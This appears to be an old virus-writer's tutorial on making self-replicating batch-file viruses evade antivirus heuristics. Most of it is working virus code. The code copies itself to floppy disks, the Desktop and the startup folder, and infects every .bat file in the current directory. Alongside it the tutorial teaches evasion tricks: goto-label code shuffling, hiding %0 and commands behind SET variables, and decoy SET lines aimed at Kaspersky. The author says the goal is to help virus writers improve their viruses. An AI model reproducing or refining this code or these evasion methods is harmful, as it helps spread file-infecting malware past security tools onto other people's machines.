				BATCH vs. Heuristic

I want to tell you now something about techiques of BAT viruses, to be don't detect by the AV's heuristic.

1.) MAIN-CODE
2.) Spaghetti-Code Technique
3.) Anti MySelf Detection
4.) SET-Operation Technique
5.) Anti SET-Includeing Technique (Fake Set OP)
6.) All together


 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *


1.) MAIN-CODE

We need a main code for that:

	@echo off
	ctty nul
	copy %0 A:\*.bat
	for %%v in (*.bat) do copy %0 %%v
	copy %0 %windir%\Desktop\open.bat
	copy %0 %windir%\startm~1\programs\autost~1\start.bat

This is our main Code! What does this Code?
It copy itself:
-> To a Disk
-> To the Desktop
-> To the english AutoStart
and
It infect all *.bat files in the currend direction!

OK, I think, this wasn't hard to understand!


 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *


2.) Spaghetti-Code technique

If you write an batch virus, it is really easy to analyse, so it's easy to detect it!
But what can you do against this?
You can disorder your code in cubes! But how does it work?
Look at this Code (Main Code):

Fist you have to include a label before every line and a goto after every line:

	:aa
	@echo off
	goto ab
	:ab
	ctty nul
	goto ac
	:ac
	copy %0 A:\*.bat
	goto ad
	:ad
	for %%v in (*.bat) do copy %0 %%v
	goto ae
	:ae
	copy %0 %windir%\Desktop\open.bat
	goto af
	:af
	copy %0 %windir%\startm~1\programs\autost~1\start.bat
	goto end
	:end

Why did you do this? Because you have to cube every line with the label and goto!
Like this (don't forget the "goto aa" at first!!):
	
	goto aa
	:ac
	copy %0 A:\*.bat
	goto ad
	:aa
	@echo off
	goto ab
	:ad
	for %%v in (*.bat) do copy %0 %%v
	goto ae
	:ab
	ctty nul
	goto ac
	:af
	copy %0 %windir%\startm~1\programs\autost~1\start.bat
	goto end
	:ae
	copy %0 %windir%\Desktop\open.bat
	goto af
	:end

OK! Now the batch virus isn't as simple as before to analyze and to detect! ;-)


 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *


3.) Anti MySelf Detection

Every normal AV programs heuristic knows, that the strings "copy %0" must be a virus!
So they or there heuristic detect the file!
What is to do? We have to delete the %0, but how?
Use the set OP, like this (you know: the main-code)!


	@echo off
	ctty nul
	set MyS=%0
	copy %MyS% A:\*.bat
	for %%v in (*.bat) do copy %MyS% %%v
	copy %MyS% %windir%\Desktop\open.bat
	copy %MyS% %windir%\startm~1\programs\autost~1\start.bat

The option "%MyS%" is the same as %0, but the AVs don't detect it!


 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *


4.) SET-Operation technique

You know, that the main-code is easy to anlyze and detect, so i developed a new technique!
You use the command SET (like the "Anti MySelf Detection"):

	@echo off
	ctty nul
	set spth=copy
	%spth% %0 A:\*.bat
	set rof=for
	%rof% %%v in (*.bat) do %spth% %0 %%v
	%spth% %0 %windir%\Desktop\open.bat
	set ss=start
	set pp=progra
	%spth% %0 %windir%\%start%m~1\%pp%ms\autost~1\start.bat

This is of corse harder to detect. If you have a longer batch-code, it will be harder and harder...

5.) Anti SET-Includeing Technique (Fake Set OP)

Kaspersky Anti Virus (KAV) is able to include the SETs to the lines 
(because of my Batch Worm Generator *bg*)! So, what to do?
You must include a Fake-SET-line! That means a line, who contains a false code before of the real
code! Look at this:

	@echo off
	ctty nul
	set spth=trhs
	set spth=copy
	%spth% %0 A:\*.bat
	set rof=fds
	set rof=for
	%rof% %%v in (*.bat) do %spth% %0 %%v
	%spth% %0 %windir%\Desktop\open.bat
	set ss=mhxb
	set ss=start
	set pp=gfdfd
	set pp=progra
	%spth% %0 %windir%\%start%m~1\%pp%ms\autost~1\start.bat

I think, you understand me!

6.) All together

This is the silly virus, includeing all the techniques I introduced:

	goto aa
	:ac
	copy %MyS% A:\*.bat
	goto ad
	:aa
	@echo off
	goto ab
	:ad
	set rof=dfg
	set rof=for
	%rof% %%v in (*.bat) do %spth% %MyS% %%v
	goto ae
	:ab
	ctty nul
	set spth=nffg
	set spth=copy
	set MyS=ztru
	set MyS=%0
	goto ac
	:af
	set da=gfd
	set da=prog
	%spth% %MyS% %windir%\startm~1\%da%rams\autost~1\start.bat
	goto end
	:ae
	%spth% %MyS% %windir%\Desktop\open.bat
	goto af
	:end

I think, this code is much better than the old main-code virus!! ;-)

I hope, I could help some virii programer to improve there viriis!
